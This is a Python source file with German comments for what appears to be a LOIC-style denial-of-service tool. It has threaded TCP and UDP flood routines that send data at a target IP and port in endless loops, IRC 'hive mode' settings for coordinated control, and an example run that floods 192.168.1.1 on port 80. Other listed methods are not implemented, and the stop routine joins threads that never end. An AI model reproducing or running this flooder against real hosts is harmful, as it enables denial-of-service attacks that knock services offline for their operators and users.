import socket
import threading
import random
from enum import Enum

# Protokoll-Typen
class Protocol(Enum):
    NONE = 0
    HTTP = 1
    TCP = 2
    UDP = 3
    ICMP = 4
    SLOWLOIC = 5
    RECOIL = 6

# Hauptklasse
class MainTool:
    def __init__(self, hive_mode=False, hide_form=False, irc_server='', irc_port='', irc_channel=''):
        self.hive_mode = hive_mode
        self.hide_form = hide_form
        self.irc_server = irc_server
        self.irc_port = irc_port
        self.irc_channel = irc_channel

        # Initialisierung der Variablen
        self.target_host = ''
        self.target_ip = ''
        self.port = 0
        self.threads = 0
        self.timeout = 30
        self.protocol = Protocol.NONE
        self.data = ''
        self.subsite = '/'
        self.flooders = []

    def attack(self, toggle, start_attack, silent=False):
        if toggle or start_attack:
            try:
                if not self.target_ip:
                    raise ValueError("Ziel-IP fehlt!")
                
                if self.protocol == Protocol.NONE:
                    raise ValueError("Ungültige Angriffsmethode!")

                print(f"Starte Angriff auf {self.target_ip}:{self.port} mit {self.threads} Threads...")
                self.start_flooders()

            except Exception as ex:
                if not silent:
                    print(f"Fehler: {ex}")
        else:
            self.stop_flooders()

    def start_flooders(self):
        self.flooders.clear()
        for _ in range(self.threads):
            flooder = threading.Thread(target=self.flood_task)
            self.flooders.append(flooder)
            flooder.start()

    def stop_flooders(self):
        print("Angriff gestoppt.")
        for flooder in self.flooders:
            if flooder.is_alive():
                flooder.join()

    def flood_task(self):
        while True:
            if self.protocol == Protocol.TCP:
                self.tcp_flood()
            elif self.protocol == Protocol.UDP:
                self.udp_flood()
            else:
                break  # Nicht unterstützter Modus

    def tcp_flood(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.target_ip, self.port))
                s.sendall(self.data.encode('utf-8'))
        except Exception as ex:
            print(f"TCP Flood Fehler: {ex}")

    def udp_flood(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(self.data.encode('utf-8'), (self.target_ip, self.port))
        except Exception as ex:
            print(f"UDP Flood Fehler: {ex}")

# Beispielaufruf
if __name__ == "__main__":
    tool = MainTool(hive_mode=True, irc_server="irc.example.com", irc_port="6667", irc_channel="#channel")
    tool.target_ip = "192.168.1.1"
    tool.port = 80
    tool.threads = 5
    tool.protocol = Protocol.TCP
    tool.data = "Flood Test"
    tool.attack(toggle=True, start_attack=True)
